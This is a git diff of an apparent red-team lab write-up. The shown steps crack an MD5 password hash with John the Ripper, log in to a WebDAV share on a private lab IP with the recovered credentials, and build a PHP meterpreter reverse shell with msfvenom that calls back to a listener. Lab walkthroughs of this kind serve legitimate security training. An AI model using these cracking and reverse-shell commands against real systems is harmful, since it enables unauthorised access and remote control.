@@ -186,7 +186,7 @@ We will find Asthon's username and password by brute force against the hidden di
 ![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/note.PNG)
 
 - Break the hashed password with Crack station website or John the Ripper.
-	- For John the Ripper, use the command: `john  - - formate=raw-md5 ryan_hash`
+	- For John the Ripper, use the command: `john  --format=raw-md5 ryan_hash`
 
 ![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/john.PNG)
 
@@ -196,22 +196,24 @@ We will find Asthon's username and password by brute force against the hidden di
 
 - Breaking the hashed password reviewed Ryan's password is `linux4u`.
 
+
 ### Step 4: Connect to the server via WebDAV
 
 Connect to the VM's WebDAV directory by following the instructions on the secret_folder.
 - Open the `File System` on the desktop.
 - Click on `Browse Network`.
 - In the URL bar, type: dav:192.168.1.105/webdav
-
 - Enter the credentials: 
 	- Username: `ryan` 
 	- Password: `linux4u`
+
 
 ![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/webdav.PNG)
 
 
 ### Step 5: Upload a PHP reverse shell payload.
 - Using MSFVenom, we will set up a reverse shell, the command: `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > shell.php`
+
 ![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/msfvenom.PNG)
 
 - Setting up a listener by following a series of command:
